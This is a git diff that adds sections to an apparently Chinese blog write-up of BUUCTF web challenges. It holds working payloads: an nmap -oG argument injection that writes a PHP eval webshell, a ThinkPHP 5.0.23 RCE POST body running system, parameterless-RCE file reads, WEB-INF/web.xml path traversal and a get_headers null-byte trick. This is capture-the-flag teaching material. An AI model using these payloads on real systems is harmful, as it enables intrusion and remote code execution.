@@ -9,6 +9,7 @@ tags:
 categories: 
   - Write-Up
 permalink: 
+top: 1
 ---
 
 by:gyy
@@ -987,7 +988,7 @@ payload：
 
 # [SUCTF 2019]CheckIn
 
-## 文件上传
+##### 文件上传
 
 ![image-20201203151206446](Buuoj-WEB-Write-up/image-20201203151206446.png)
 
@@ -1037,6 +1038,294 @@ ok,再传码
 
 
 ----
+
+
+
+# [RoarCTF 2019]Easy Java
+
+记录一道特殊的题， 很简单的web题，但是需要对java容器和项目存放位置比较了解，作为web选手，应该要对几大语言的容器，项目环境，有所了解。
+
+考点：**WEB-INF/web.xml泄露**
+
+```
+WEB-INF主要包含一下文件或目录:
+/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。
+/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中
+/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件
+/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。
+/WEB-INF/database.properties：数据库配置文件
+漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码
+```
+
+![image-20201208175741483](Buuoj-WEB-Write-up/image-20201208175741483.png)
+
+打开为登陆界面，SQL注入无果，点`help`，发现url变化为`./Download?filename=help.docx`
+
+猜测源码泄露，尝试伪协议读取源码`php://filter/convert.base64-encode/resource=help.docx`发现报错为`java.io.FileNotFoundException:{php://filter/convert.base64-encode/resource=help.docx}`
+
+结合题目名，猜测JAVA-WEB应用
+
+报错是tomcat，尝试包含tomcat的web.xml，更改方式为POST请求，传参`filename=WEB-INF/web.xml`
+
+![image-20201208180232236](Buuoj-WEB-Write-up/image-20201208180232236.png)
+
+尝试请求`/Flag`
+
+![image-20201208180450678](Buuoj-WEB-Write-up/image-20201208180450678.png)
+
+ 结合tomcat的项目存放路径经验试试下载FlagController.class 
+
+传参`filename=WEB-INF/classes/com/wm/ctf/FlagController.class`
+
+![image-20201208180558946](Buuoj-WEB-Write-up/image-20201208180558946.png)
+
+直接访问下载也行，抓包请求也行，base64解码一下发现flag
+
+![image-20201208180825474](Buuoj-WEB-Write-up/image-20201208180825474.png)
+
+---
+
+
+
+# [BUUCTF 2018]Online Tool
+
+nmap工具的利用
+
+```php
+<?php
+
+if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
+}
+
+if(!isset($_GET['host'])) {
+    highlight_file(__FILE__);
+} else {
+    $host = $_GET['host'];
+    $host = escapeshellarg($host);
+    $host = escapeshellcmd($host);
+    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
+    echo 'you are in sandbox '.$sandbox;
+    @mkdir($sandbox);
+    chdir($sandbox);
+    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
+}
+```
+
+考两个函数`escapeshellarg`
+
+ **escapeshellcmd()** 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 
+
+`escapeshellarg`
+
+ **escapeshellarg()** 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。 
+
+
+
+然而之前就爆出了漏洞... 当先使用 escapeshellarg 再使用 escapeshellcmd 时，就可能导致命令参数注入。 
+
+如
+
+`curl '127.0.0.1'\\'' -v -d a=1\'`
+
+相当于`curl 127.0.0.1\ -v -d a=1'`
+
+字符转义了
+
+
+
+查阅nmap帮助手册`nmap -h`
+
+首先想读取文件，利用`-iL`参数
+
+![image-20201208184745868](Buuoj-WEB-Write-up/image-20201208184745868.png)
+
+发现不行，cmd可以，但执行后没有回显，以下为本地环境
+
+![image-20201208190824314](Buuoj-WEB-Write-up/image-20201208190824314.png)
+
+![image-20201208190921276](Buuoj-WEB-Write-up/image-20201208190921276.png)
+
+关键在于没法构造，毕竟两函数有转义的，于是有了另一种方法，输出。
+
+利用`-oG`参数
+
+![image-20201208184653935](Buuoj-WEB-Write-up/image-20201208184653935.png)
+
+直接写一句话木马就好了
+
+payload=`./?host='<?php eval($_POST[gyy]);?> -oG shell.php '`
+
+最后和单引号要有空格，因为让system执行时最后的参数是`shell.php`而不是`shell.php\'`，因为 **escapeshellarg()**和**escapeshellcmd()** 有转义，单引号是因为函数会检查字符串匹配引号的情况
+
+![image-20201208193014462](Buuoj-WEB-Write-up/image-20201208193014462.png)
+
+查看文件
+
+![image-20201208193048924](Buuoj-WEB-Write-up/image-20201208193048924.png)
+
+拿到shell
+
+![image-20201208193135957](Buuoj-WEB-Write-up/image-20201208193135957.png)
+
+本地文件是这样的，可以看到包含了一句话木马
+
+![image-20201208193533711](Buuoj-WEB-Write-up/image-20201208193533711.png)
+
+---
+
+
+
+# [GKCTF2020]cve版签到
+
+#####  cve-2020-7066 
+
+ **将get_headers（）与用户提供的URL一起使用时**，如果URL包含零（\ 0）字符，则URL将被静默地**截断**。**这可能会导致某些软件对get_headers（）的目标做出错误的假设，并可能将某些信息发送到错误的服务器。** 
+
+题目讲明为CVE，排除SSRF
+
+在响应头中发现hint
+
+![image-20201208195802041](Buuoj-WEB-Write-up/image-20201208195802041.png)
+
+访问`./?url=http://localhost%00www.ctfhub.com`
+
+![image-20201208195922474](Buuoj-WEB-Write-up/image-20201208195922474.png)
+
+`Tips: Host must be end with '123'`
+
+访问`./?url=http://127.0.0.123%00www.ctfhub.com`即可
+
+![image-20201208200037696](Buuoj-WEB-Write-up/image-20201208200037696.png)
+
+主要考一个CVE，记录一下
+
+---
+
+
+
+# [GXYCTF2019]禁止套娃
+
+git泄露
+
+一点提示都没有！可恶
+
+`robots.txt`没有，响应头没有，随手访问了个`./.git/`结果真有，直接上GitHack
+
+
+
+![image-20201208202421537](Buuoj-WEB-Write-up/image-20201208202421537.png)
+
+强烈谴责！GitHack重新下个就好了，旧的这个还不管用，GitHack还有假的？？？
+
+
+
+![image-20201208203755631](Buuoj-WEB-Write-up/image-20201208203755631.png)
+
+得到源码
+
+```php
+<?php
+include "flag.php";
+echo "flag在哪里呢？<br>";
+if(isset($_GET['exp'])){
+    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
+        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
+            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
+                // echo $_GET['exp'];
+                @eval($_GET['exp']);
+            }
+            else{
+                die("还差一点哦！");
+            }
+        }
+        else{
+            die("再好好想想！");
+        }
+    }
+    else{
+        die("还想读flag，臭弟弟！");
+    }
+}
+// highlight_file(__FILE__);
+?>
+
+```
+
+很好，看到这个`';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp']`妥妥的无参数RCE
+
+过滤一堆
+
+先扫当前目录
+
+payload=`./?exp=print_r(scandir(current(localeconv())));`
+
+```shell
+localeconv(): 返回一包含本地数字及货币格式信息的数组。如下图
+current(): 取数组中第一个元素，返回数组中的当前单元。
+current(localeconv()): 取符号.
+scandir(): 扫描目录
+scandir(current(localeconv()))： 等同于scandir(.)，即扫描当前目录
+print_r()： 输出
+```
+
+![image-20201208205457822](Buuoj-WEB-Write-up/image-20201208205457822.png)_localeconv()如图所示
+
+![image-20201208205704606](Buuoj-WEB-Write-up/image-20201208205704606.png)_current(localeconv())取到了符号.
+
+
+
+![image-20201208205956327](Buuoj-WEB-Write-up/image-20201208205956327.png)
+
+发现了flag.php
+
+下面要取flag.php中的内容，flag.php在倒数第二组
+
+由于没有禁用session，利用session~~（我最喜欢~~
+
+![~](Buuoj-WEB-Write-up/image-20201208210427209.png)
+
+其他方法
+
+payload=`./?exp=readfile(array_rand(array_flip(scandir(current(localeconv())))));`
+
+```
+array_flip()： 交换数组的键和值
+array_rand()： 从数组中随机取出一个或多个单元
+readfile()： 读文件
+```
+
+![image-20201208211502701](Buuoj-WEB-Write-up/image-20201208211502701.png)
+
+有点小运气嗷，可以写脚本跑，反正随机嘛...概率问题
+
+读源码方法
+
+```
+file_get_contents()： 本题被ban
+view-source:
+highlight_file()
+show_source()
+readfile()
+```
+
+
+
+----
+
+# [BJDCTF 2nd]old-hack
+
+##### thinkphp5.0.23 远程代码执行 漏洞
+
+payload：
+
+POST
+
+```
+_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=cat /flag
+```
+
+---
 
 
 
